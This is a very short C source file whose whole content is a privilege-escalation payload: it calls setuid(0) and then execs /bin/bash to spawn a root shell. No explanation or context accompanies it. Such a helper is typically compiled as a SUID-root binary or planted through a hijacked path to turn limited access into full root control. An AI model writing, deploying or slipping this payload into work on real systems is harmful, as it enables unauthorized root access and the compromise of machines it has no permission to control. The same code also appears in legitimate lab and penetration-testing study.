#include <unistd.h>
int main(){
    setuid(0);
    execl("/bin/bash", "bash", NULL);
}